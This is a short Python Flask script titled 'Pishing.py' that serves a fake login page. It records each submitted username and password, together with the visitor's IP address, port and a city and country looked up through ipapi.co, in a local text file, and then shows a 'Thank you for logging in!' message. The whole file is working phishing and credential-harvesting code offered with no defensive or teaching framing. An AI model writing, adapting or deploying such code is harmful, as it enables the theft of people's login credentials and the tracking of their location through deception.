# Pishing.py

from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
fake_site_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Login Page</title>
</head>
<body>
    <h1>Welcome to Fake Site</h1>
    <form action="/capture" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
'''

@app.route('/')
def fake_site():
    return render_template_string(fake_site_template)

@app.route('/capture', methods=['POST'])
def capture_data():
    user_ip = request.remote_addr
    user_port = request.environ.get('REMOTE_PORT')
    user_location = get_location(user_ip)
    username = request.form.get('username')
    password = request.form.get('password')

    # Save captured data to a file
    with open('captured_data.txt', 'a') as file:
        file.write(f"IP: {user_ip}, Port: {user_port}, Location: {user_location}, Username: {username}, Password: {password}\n")

    return "Thank you for logging in!"

def get_location(ip):
    response = requests.get(f'https://ipapi.co/{ip}/json/')
    location_data = response.json()
    return f"{location_data['city']}, {location_data['region']}, {location_data['country_name']}"

if __name__ == '__main__':
    app.run(debug=True)
